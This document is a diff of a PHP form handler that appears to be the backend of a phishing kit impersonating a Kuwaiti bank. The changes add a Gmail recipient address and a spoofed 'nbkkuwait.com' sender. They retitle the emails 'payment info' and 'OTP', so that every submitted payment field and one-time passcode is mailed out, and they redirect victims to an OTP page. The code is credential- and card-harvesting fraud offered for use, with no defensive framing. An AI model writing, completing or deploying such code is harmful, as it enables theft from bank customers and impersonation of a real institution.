@@ -1,5 +1,10 @@
 <?php
 
+
+$to = "hassankiwan92@gmail.com";
+$sender="admin@nbkkuwait.com";
+
+
 if(isset($_POST)) {
     if(isset($_POST['action']) =='sendtEmailPatment'){  
         sendtEmailPatment($_POST);
@@ -7,19 +12,18 @@ if(isset($_POST)) {
         sendOTP($_POST) ;
     }
 
-
     exit;  
 }
 
 function sendtEmailPatment($data){
-    $to = "recipient@example.com";
-    $subject = "Test Email";
+
+    $subject = "payment info";
     $message="";
     foreach($data as $key=>$msg){
         $message.= "$key :  $msg\n";
     }
-    $headers = "From: sender@example.com\r\n";
-    $headers .= "Reply-To: sender@example.com\r\n";
+    $headers = "From: $sender\r\n";
+    $headers .= "Reply-To: $sender\r\n";
     $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
     
     header("Location: ./otp.php");
@@ -34,20 +38,20 @@ function sendtEmailPatment($data){
 
 function sendOTP($data){
     $to = "recipient@example.com";
-    $subject = "Test Email";
+    $subject = "OTP";
     $message="";
     foreach($data as $key=>$msg){
         $message.= "$key :  $msg\n";
     }
-    $headers = "From: sender@example.com\r\n";
-    $headers .= "Reply-To: sender@example.com\r\n";
+    $headers = "From: $sender\r\n";
+    $headers .= "Reply-To: $sender\r\n";
     $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
     
     // Send the email
     if (mail($to, $subject, $message, $headers)) {
-        echo "Email sent successfully!";
+        echo "successfully!";
     } else {
-        echo "Failed to send email.";
+        echo "Failed.";
     }
 }
 ?>
